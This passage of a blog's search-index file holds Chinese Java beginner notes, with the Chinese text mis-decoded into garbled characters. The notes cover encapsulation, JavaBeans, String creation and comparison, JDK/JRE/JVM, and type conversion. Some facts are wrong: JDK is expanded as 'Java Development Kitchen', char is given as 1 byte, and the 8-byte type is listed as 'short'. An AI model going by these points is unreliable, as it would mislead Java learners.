class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Person</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">double</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//setter</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setAge</span><span class="params">(<span class="keyword">double</span> age)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (age &gt;= <span class="number">0</span> &amp;&amp; age &lt;= <span class="number">150</span>)&#123;</span><br><span class="line">            <span class="keyword">this</span>.age = age;</span><br><span class="line">            System.out.println(<span class="string">&quot;å¹´é¾„åˆæ³•&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;å¹´é¾„ä¸åˆæ³•&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//getter</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">double</span> <span class="title">getAge</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.age;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Mainç±»</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Person user1 = <span class="keyword">new</span> Person();</span><br><span class="line">        user1.setAge(<span class="number">20</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;å¹´é¾„ï¼š&quot;</span> + user1.getAge());</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;-----&quot;</span>);</span><br><span class="line"></span><br><span class="line">        Person user2 = <span class="keyword">new</span> Person();</span><br><span class="line">        user2.setAge(<span class="number">200</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;å¹´é¾„ï¼š&quot;</span> + user2.getAge());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://hexo-1302945528.cos.ap-chengdu.myqcloud.com/posts/image/image-20211231003519864.png" alt="image-20211231003519864"></p><h2 id="ä¸‰ã€JavaBean"><a href="#ä¸‰ã€JavaBean" class="headerlink" title="ä¸‰ã€JavaBean"></a>ä¸‰ã€JavaBean</h2><h3 id="1ã€æ¦‚å¿µ"><a href="#1ã€æ¦‚å¿µ" class="headerlink" title="1ã€æ¦‚å¿µ"></a>1ã€æ¦‚å¿µ</h3><p>JavaBeanå¯ä»¥ç†è§£ä¸ºå®ä½“ç±»ï¼Œå¯ç”¨äºå­˜å–æ•°æ®ã€å°è£…æ•°æ®ï¼Œä¸€ä¸ªå®ä½“ç±»å¿…é¡»åŒ…å«ä»¥ä¸‹ä¸‰è¦ç´ ï¼š</p><ol><li> å¿…é¡»æä¾›ä¸€ä¸ªæ— å‚æ„é€ å™¨ï¼ˆæœ‰å‚çœ‹éœ€æ±‚ï¼‰</li><li> æˆå‘˜å˜é‡ç§æœ‰ï¼ˆprivateä¿®é¥°ï¼‰</li><li> æ¯ä¸ªæˆå‘˜å˜é‡éƒ½æœ‰å¯¹åº”çš„setXxx()å’ŒgetXxx()æ–¹æ³•æ¥ä¾›å¤–éƒ¨æ“ä½œ</li></ol><p><img src="https://hexo-1302945528.cos.ap-chengdu.myqcloud.com/posts/image/image-20220101175029264.png" alt="image-20220101175029264"></p><p>IDEAä¸­å¯å¿«æ·ç”Ÿæˆç›¸å…³ä»£ç ã€‚</p><h3 id="2ã€ç¤ºä¾‹-1"><a href="#2ã€ç¤ºä¾‹-1" class="headerlink" title="2ã€ç¤ºä¾‹"></a>2ã€ç¤ºä¾‹</h3><p>æ ‡å‡†å®ä½“ç±»ï¼šPersonç±»</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Person</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> Double age;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// æ— å‚æ„é€ å™¨</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Person</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// æœ‰å‚æ„é€ å™¨ï¼ˆå¯é€‰ï¼‰</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Person</span><span class="params">(String name, Double age)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">        <span class="keyword">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Double <span class="title">getAge</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setAge</span><span class="params">(Double age)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="å››ã€Stringç±»"><a href="#å››ã€Stringç±»" class="headerlink" title="å››ã€Stringç±»"></a>å››ã€Stringç±»</h2><h3 id="1ã€å¸¸è§å‡ ç§å¯¹è±¡åˆ›å»ºæ–¹å¼"><a href="#1ã€å¸¸è§å‡ ç§å¯¹è±¡åˆ›å»ºæ–¹å¼" class="headerlink" title="1ã€å¸¸è§å‡ ç§å¯¹è±¡åˆ›å»ºæ–¹å¼"></a>1ã€å¸¸è§å‡ ç§å¯¹è±¡åˆ›å»ºæ–¹å¼</h3><h4 id="1ï¼‰String-s1-quot-quot"><a href="#1ï¼‰String-s1-quot-quot" class="headerlink" title="1ï¼‰String s1 = &quot; &quot;"></a>1ï¼‰<code>String s1 = &quot; &quot;</code></h4><h4 id="2ï¼‰String-s2-new-String-quot-quot"><a href="#2ï¼‰String-s2-new-String-quot-quot" class="headerlink" title="2ï¼‰String s2 = new String(&quot; &quot;)"></a>2ï¼‰<code>String s2 = new String(&quot; &quot;)</code></h4><h4 id="3ï¼‰å­—ç¬¦æ•°ç»„è‡ªåŠ¨åˆå¹¶ä¸ºå­—ç¬¦ä¸²"><a href="#3ï¼‰å­—ç¬¦æ•°ç»„è‡ªåŠ¨åˆå¹¶ä¸ºå­—ç¬¦ä¸²" class="headerlink" title="3ï¼‰å­—ç¬¦æ•°ç»„è‡ªåŠ¨åˆå¹¶ä¸ºå­—ç¬¦ä¸²"></a>3ï¼‰å­—ç¬¦æ•°ç»„è‡ªåŠ¨åˆå¹¶ä¸ºå­—ç¬¦ä¸²</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span>[] c1 = &#123;<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>&#125;;</span><br><span class="line">String s5 = <span class="keyword">new</span> String(c1);</span><br></pre></td></tr></table></figure><h4 id="4ï¼‰-byteå­—èŠ‚å‹è‡ªåŠ¨è½¬ä¸ºå­—ç¬¦ï¼Œå†åˆå¹¶ä¸ºå­—ç¬¦ä¸²"><a href="#4ï¼‰-byteå­—èŠ‚å‹è‡ªåŠ¨è½¬ä¸ºå­—ç¬¦ï¼Œå†åˆå¹¶ä¸ºå­—ç¬¦ä¸²" class="headerlink" title="4ï¼‰ byteå­—èŠ‚å‹è‡ªåŠ¨è½¬ä¸ºå­—ç¬¦ï¼Œå†åˆå¹¶ä¸ºå­—ç¬¦ä¸²"></a>4ï¼‰ byteå­—èŠ‚å‹è‡ªåŠ¨è½¬ä¸ºå­—ç¬¦ï¼Œå†åˆå¹¶ä¸ºå­—ç¬¦ä¸²</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">byte</span>[] byte1 = &#123;<span class="number">97</span>, <span class="number">98</span>, <span class="number">99</span>&#125;;</span><br><span class="line">String s6 = <span class="keyword">new</span> String(byte1);</span><br></pre></td></tr></table></figure><h3 id="2ã€Stringç±»å‹å˜é‡å¯¹æ¯”"><a href="#2ã€Stringç±»å‹å˜é‡å¯¹æ¯”" class="headerlink" title="2ã€Stringç±»å‹å˜é‡å¯¹æ¯”"></a>2ã€Stringç±»å‹å˜é‡å¯¹æ¯”</h3><h4 id="1ï¼‰â€-â€œåˆ›å»ºçš„Stringå˜é‡ä¹‹é—´çš„å¯¹æ¯”"><a href="#1ï¼‰â€-â€œåˆ›å»ºçš„Stringå˜é‡ä¹‹é—´çš„å¯¹æ¯”" class="headerlink" title="1ï¼‰â€ â€œåˆ›å»ºçš„Stringå˜é‡ä¹‹é—´çš„å¯¹æ¯”"></a>1ï¼‰â€ â€œåˆ›å»ºçš„Stringå˜é‡ä¹‹é—´çš„å¯¹æ¯”</h4><p>â€œ â€åˆ›å»ºçš„å˜é‡ï¼Œå˜é‡å­˜å‚¨çš„æ˜¯å¸¸é‡åœ¨å †å†…å­˜ä¸­çš„åœ°å€ï¼ŒåŒæ ·çš„å¸¸é‡ï¼Œå¸¸é‡æ± ä¸­åªå­˜åœ¨ä¸€ä¸ªï¼Œå› æ­¤ä¸¤ä¸ªå˜é‡åœ°å€ç›¸åŒ</p><p><img src="https://hexo-1302945528.cos.ap-chengdu.myqcloud.com/posts/image/image-20220102231232012.png" alt="image-20220102231232012"></p><h4 id="2ï¼‰new-Stringåˆ›å»ºçš„Stringå˜é‡ä¹‹é—´çš„å¯¹æ¯”"><a href="#2ï¼‰new-Stringåˆ›å»ºçš„Stringå˜é‡ä¹‹é—´çš„å¯¹æ¯”" class="headerlink" title="2ï¼‰new Stringåˆ›å»ºçš„Stringå˜é‡ä¹‹é—´çš„å¯¹æ¯”"></a>2ï¼‰new Stringåˆ›å»ºçš„Stringå˜é‡ä¹‹é—´çš„å¯¹æ¯”</h4><p>ä¸¤ä¸ªnew Stringåˆ›å»ºä¸¤ä¸ªå­—ç¬¦ä¸²å¯¹è±¡ï¼Œåœ°å€ä¸åŒ</p><p><img src="https://hexo-1302945528.cos.ap-chengdu.myqcloud.com/posts/image/image-20220102233225918.png" alt="image-20220102233225918"></p><h4 id="3ï¼‰â€-â€œå’Œnew-Stringåˆ›å»ºçš„Stringå˜é‡ä¹‹é—´çš„å¯¹æ¯”"><a href="#3ï¼‰â€-â€œå’Œnew-Stringåˆ›å»ºçš„Stringå˜é‡ä¹‹é—´çš„å¯¹æ¯”" class="headerlink" title="3ï¼‰â€ â€œå’Œnew Stringåˆ›å»ºçš„Stringå˜é‡ä¹‹é—´çš„å¯¹æ¯”"></a>3ï¼‰â€ â€œå’Œnew Stringåˆ›å»ºçš„Stringå˜é‡ä¹‹é—´çš„å¯¹æ¯”</h4><p>â€œ â€åˆ›å»ºçš„å˜é‡å­˜çš„å¸¸é‡åœ°å€ï¼Œnew Stringåˆ›å»ºå­—ç¬¦ä¸²å¯¹è±¡ï¼Œå˜é‡å­˜çš„å­—ç¬¦ä¸²å¯¹è±¡åœ°å€ï¼Œä¸¤ä¸ªåœ°å€ä¸åŒ</p><h3 id="4ï¼‰equals"><a href="#4ï¼‰equals" class="headerlink" title="4ï¼‰equals()"></a>4ï¼‰equals()</h3><p>equals()æ–¹æ³•åªå¯¹æ¯”å˜é‡å†…å®¹</p><h3 id="4ã€ç¤ºä¾‹"><a href="#4ã€ç¤ºä¾‹" class="headerlink" title="4ã€ç¤ºä¾‹"></a>4ã€ç¤ºä¾‹</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* Stringç±»ä½¿ç”¨ç¤ºä¾‹ï¼š</span></span><br><span class="line"><span class="comment">*   1ã€å‡ ç§å¸¸ç”¨çš„åˆ›å»ºæ–¹å¼</span></span><br><span class="line"><span class="comment">*   2ã€Stringç±»æ“ä½œAPI</span></span><br><span class="line"><span class="comment">* */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">StringDemo</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        String s1 = <span class="string">&quot;ç¤ºä¾‹&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ç¬¬ä¸€å¼ åˆ›å»ºæ–¹å¼ï¼ˆå¸¸ç”¨ï¼‰</span></span><br><span class="line">        String s2 = <span class="string">&quot;ç¤ºä¾‹&quot;</span>;</span><br><span class="line">        <span class="comment">// è¿”å›trueï¼šâ€œ â€åˆ›å»ºçš„å˜é‡ï¼Œå˜é‡å­˜å‚¨çš„æ˜¯å¸¸é‡åœ¨å †å†…å­˜ä¸­çš„åœ°å€ï¼ŒåŒæ ·çš„å¸¸é‡ï¼Œå¸¸é‡æ± ä¸­åªå­˜åœ¨ä¸€ä¸ªï¼Œå› æ­¤åœ°å€ç›¸åŒ</span></span><br><span class="line">        System.out.println(s1 == s2);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ç¬¬äºŒç§åˆ›å»ºæ–¹å¼ï¼ˆä¸å¸¸ç”¨ï¼‰</span></span><br><span class="line">        String s3 = <span class="keyword">new</span> String(<span class="string">&quot;ç¤ºä¾‹&quot;</span>);</span><br><span class="line">        <span class="comment">// è¿”å›falseï¼šâ€œ â€åˆ›å»ºçš„å˜é‡å­˜çš„å¸¸é‡åœ°å€ï¼Œnew Stringåˆ›å»ºå­—ç¬¦ä¸²å¯¹è±¡ï¼Œå˜é‡å­˜çš„å­—ç¬¦ä¸²å¯¹è±¡åœ°å€ï¼Œä¸¤ä¸ªåœ°å€ä¸åŒ</span></span><br><span class="line">        System.out.println(s1 == s3);</span><br><span class="line"></span><br><span class="line">        String s4 = <span class="keyword">new</span> String(<span class="string">&quot;ç¤ºä¾‹&quot;</span>);</span><br><span class="line">        <span class="comment">// è¿”å›falseï¼šä¸¤ä¸ªnew Stringåˆ›å»ºä¸¤ä¸ªå­—ç¬¦ä¸²å¯¹è±¡ï¼Œåœ°å€ä¸åŒ</span></span><br><span class="line">        System.out.println(s3 == s4);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// å­—ç¬¦æ•°ç»„è‡ªåŠ¨åˆå¹¶ä¸ºå­—ç¬¦ä¸²</span></span><br><span class="line">        <span class="keyword">char</span>[] c1 = &#123;<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>&#125;;</span><br><span class="line">        String s5 = <span class="keyword">new</span> String(c1);</span><br><span class="line">        System.out.println(<span class="string">&quot;s5: &quot;</span> + s5);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// byteå­—èŠ‚å‹è‡ªåŠ¨è½¬ä¸ºå­—ç¬¦ï¼Œå†åˆå¹¶ä¸ºå­—ç¬¦ä¸²</span></span><br><span class="line">        <span class="keyword">byte</span>[] byte1 = &#123;<span class="number">97</span>, <span class="number">98</span>, <span class="number">99</span>&#125;;</span><br><span class="line">        String s6 = <span class="keyword">new</span> String(byte1);</span><br><span class="line">        System.out.println(<span class="string">&quot;s6: &quot;</span> + s6);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// è¿”å›trueï¼šequals()æ–¹æ³•åªå¯¹æ¯”å˜é‡å†…å®¹</span></span><br><span class="line">        System.out.println(s3.equals(s4));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://hexo-1302945528.cos.ap-chengdu.myqcloud.com/posts/image/image-20220102235307192.png" alt="image-20220102235307192"></p>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Javaå­¦ä¹ ä¹‹è·¯ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ã€Javaå­¦ä¹ ä¹‹è·¯ã€‘SE1 - åŸºæœ¬æ¦‚å¿µåŠè¯­æ³•</title>
      <link href="post/202110252133.html"/>
      <url>post/202110252133.html</url>
      
        <content type="html"><![CDATA[<h2 id="ä¸€ã€åŸºç¡€æ¦‚å¿µ"><a href="#ä¸€ã€åŸºç¡€æ¦‚å¿µ" class="headerlink" title="ä¸€ã€åŸºç¡€æ¦‚å¿µ"></a>ä¸€ã€åŸºç¡€æ¦‚å¿µ</h2><h3 id="1ã€JDKã€JREå…³ç³»"><a href="#1ã€JDKã€JREå…³ç³»" class="headerlink" title="1ã€JDKã€JREå…³ç³»"></a>1ã€JDKã€JREå…³ç³»</h3><p><strong>æ€»ï¼š</strong>JDKåŒ…å«JREã€JREåŒ…å«JVM</p><p>JDKï¼ˆJava Development Kitchenï¼‰ï¼šJavaå¼€å‘å·¥å…·ï¼ŒåŒ…æ‹¬javaç¼–è¯‘å™¨ã€javaè™šæ‹Ÿæœºã€javaç±»åº“ç­‰javaå¼€å‘è¿è¡Œæ‰€éœ€çš„æ‰€æœ‰ä¸œè¥¿</p><p>JREï¼ˆJava Runtime Environmentï¼‰ï¼šJavaè¿è¡Œç¯å¢ƒï¼ŒåŒ…å«javaè™šæ‹ŸæœºJVMå’Œjavaç±»åº“</p><p>JVMï¼ˆJava Virtual Machineï¼‰ï¼šJavaè™šæ‹Ÿæœºï¼Œè·¨å¹³å°æ”¯æŒåŸºç¡€ï¼ŒçœŸæ­£è¿è¡Œjavaç¨‹åºçš„åœ°æ–¹</p><p><strong>ç»“ï¼š</strong></p><p>1ã€å®‰è£…JDKå³è¡¨ç¤ºå®‰è£…äº†Javaå¼€å‘è¿è¡Œæ‰€éœ€çš„æ‰€æœ‰ç¯å¢ƒ</p><p>2ã€å¦‚æœæ˜¯ä¼ä¸šéƒ¨ç½²æƒ…å†µä¸‹ï¼Œå¯èƒ½ä¸éœ€è¦å¼€å‘ç¯å¢ƒï¼Œå› æ­¤åªéœ€å®‰è£…JREèƒ½å¤Ÿè‡³æ­¤javaé¡¹ç›®è¿è¡Œå³å¯</p><h3 id="2ã€javaç¨‹åºè¿è¡Œè¿‡ç¨‹"><a href="#2ã€javaç¨‹åºè¿è¡Œè¿‡ç¨‹" class="headerlink" title="2ã€javaç¨‹åºè¿è¡Œè¿‡ç¨‹"></a>2ã€javaç¨‹åºè¿è¡Œè¿‡ç¨‹</h3><p><strong>æ€»ï¼š</strong>javacå°†.javaæ–‡ä»¶ç¼–è¯‘æˆ.classæ–‡ä»¶ï¼Œjavaè¿è¡Œ.classæ–‡ä»¶</p><p>å®‰è£…å¥½çš„JDKä¸­åŒ…å«ä¸€ä¸ªjava.exeå’Œjavac.exeï¼Œjavac.exeç”¨äºå°†.javaæ–‡ä»¶ç¼–è¯‘æˆè·¨å¹³å°çš„.classæ–‡ä»¶ï¼Œjava.exeå°†.classæ–‡ä»¶è½¬æ¢ä¸ºæœºå™¨ç å¹¶æ‰§è¡Œã€‚</p><p>ç®€å•çš„javaç¨‹åºï¼ŒHelloWorld.javaï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HelloWorld</span></span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">System.out.println(<span class="string">&quot;Hello World&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>cmdä¸­æ‰§è¡Œä»¥ä¸‹å‘½ä»¤è¿è¡Œï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">javac HelloWorld.java</span><br><span class="line">java HelloWorld</span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;HelloWorld</span></span><br></pre></td></tr></table></figure><p><img src="https://hexo-1302945528.cos.ap-chengdu.myqcloud.com/posts/image/202110250054215.png" alt="image-20211023180240166"></p><h2 id="äºŒã€åŸºæœ¬è¯­æ³•"><a href="#äºŒã€åŸºæœ¬è¯­æ³•" class="headerlink" title="äºŒã€åŸºæœ¬è¯­æ³•"></a>äºŒã€åŸºæœ¬è¯­æ³•</h2><h3 id="1ã€ç±»å‹è½¬æ¢"><a href="#1ã€ç±»å‹è½¬æ¢" class="headerlink" title="1ã€ç±»å‹è½¬æ¢"></a>1ã€ç±»å‹è½¬æ¢</h3><h4 id="è‡ªåŠ¨ç±»å‹è½¬æ¢"><a href="#è‡ªåŠ¨ç±»å‹è½¬æ¢" class="headerlink" title="è‡ªåŠ¨ç±»å‹è½¬æ¢"></a>è‡ªåŠ¨ç±»å‹è½¬æ¢</h4><p>å°èŒƒå›´ç±»å‹çš„å˜é‡ï¼Œå¯ä»¥ç›´æ¥ç›´æ¥å¤åˆ¶ç»™å¤§èŒƒå›´çš„å˜é‡ï¼Œä»¥ä¸‹éå†è‡ªåŠ¨å‘ä¸‹è½¬æ¢ï¼Œå¯è·¨çº§</p><ul><li>byte:1å­—èŠ‚</li><li>short:2å­—èŠ‚ã€char:1å­—èŠ‚</li><li>int:4å­—èŠ‚</li><li>long:8å­—èŠ‚</li><li>float:4å­—èŠ‚</li><li>short:8å­—èŠ‚</li></ul><p>åº•å±‚åŸç†ï¼šå°èŒƒå›´å˜é‡è½¬æ¢æˆ2è¿›åˆ¶å¡«åˆ°ç›®æ ‡è¿›åˆ¶äºŒè¿›åˆ¶åï¼Œç›®æ ‡è¿›åˆ¶å˜é‡å‰è¾¹å…¶ä½™ä½å¡«å……0</p><p><img src="https://hexo-1302945528.cos.ap-chengdu.myqcloud.com/posts/image/202110250054705.png" alt="screen_2021-10-23_21-20-46"></p><p>ä»£ç å—ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*è‡ªåŠ¨ç±»å‹è½¬æ¢*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Type</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="comment">/*1ã€è‡ªåŠ¨ç±»å‹è½¬æ¢*/</span></span><br><span class="line">        autoTypeConversion();</span><br><span class="line">        <span class="comment">/*2ã€è¡¨è¾¾å¼ä¸­çš„è‡ªåŠ¨ç±»å‹è½¬æ¢*/</span></span><br><span class="line">        autoTypeConversionInExpression();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*1ã€è‡ªåŠ¨ç±»å‹è½¬æ¢:</span></span><br><span class="line"><span class="comment">    * å°èŒƒå›´ç±»å‹çš„å˜é‡ï¼Œå¯ä»¥ç›´æ¥ç›´æ¥å¤åˆ¶ç»™å¤§èŒƒå›´çš„å˜é‡*/</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">autoTypeConversion</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;è‡ªåŠ¨ç±»å‹è½¬æ¢è¾“å‡ºï¼š&quot;</span>);</span><br><span class="line">        <span class="keyword">byte</span> a = <span class="number">127</span>;</span><br><span class="line">        <span class="keyword">int</span> b = a;</span><br><span class="line">        <span class="keyword">float</span> f = b;</span><br><span class="line">        <span class="keyword">char</span> c = <span class="string">&#x27;v&#x27;</span>; <span class="comment">//å•å¼•å·charç±»å‹ï¼ŒåŒå¼•å·Stringç±»å‹</span></span><br><span class="line">        <span class="keyword">int</span> d = c;</span><br><span class="line">        System.out.println(<span class="string">&quot;b: &quot;</span> + b); <span class="comment">//è¾“å‡º127</span></span><br><span class="line">        System.out.println(<span class="string">&quot;f: &quot;</span> + f); <span class="comment">//è¾“å‡º127.0</span></span><br><span class="line">        System.out.println(<span class="string">&quot;d: &quot;</span> + d); <span class="comment">//è¾“å‡ºvçš„asciiå€¼</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*2ã€è¡¨è¾¾å¼ä¸­çš„è‡ªåŠ¨ç±»å‹è½¬æ¢</span></span><br><span class="line"><span class="comment">     * 1)å°èŒƒå›´ä¼šè‡ªåŠ¨è½¬æ¢ä¸ºå¤§èŒƒå›´åå†è¿è¡Œ</span></span><br><span class="line"><span class="comment">     * 2)è¡¨è¾¾å¼ä¸­byteã€charã€shortæ˜¯ç›´æ¥è½¬æ¢æˆintåå†å‚ä¸è¿ç®—çš„</span></span><br><span class="line"><span class="comment">     * */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">autoTypeConversionInExpression</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;è¡¨è¾¾å¼ä¸­çš„è‡ªåŠ¨ç±»å‹è½¬æ¢è¾“å‡ºï¼š&quot;</span>);</span><br><span class="line">        <span class="keyword">byte</span> a = <span class="number">10</span>;</span><br><span class="line">        <span class="keyword">byte</span> b = <span class="number">20</span>;</span><br><span class="line"><span class="comment">//        byte c = a + b; æŠ¥é”™</span></span><br><span class="line">        <span class="keyword">int</span> c = a + b; <span class="comment">//30</span></span><br><span class="line">        <span class="keyword">float</span> d = a + b; <span class="comment">//30.0</span></span><br><span class="line">        System.out.printf(<span class="string">&quot;c: %d\nd: %s&quot;</span>, c, d);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="å¼ºåˆ¶ç±»å‹è½¬æ¢"><a href="#å¼ºåˆ¶ç±»å‹è½¬æ¢" class="headerlink" 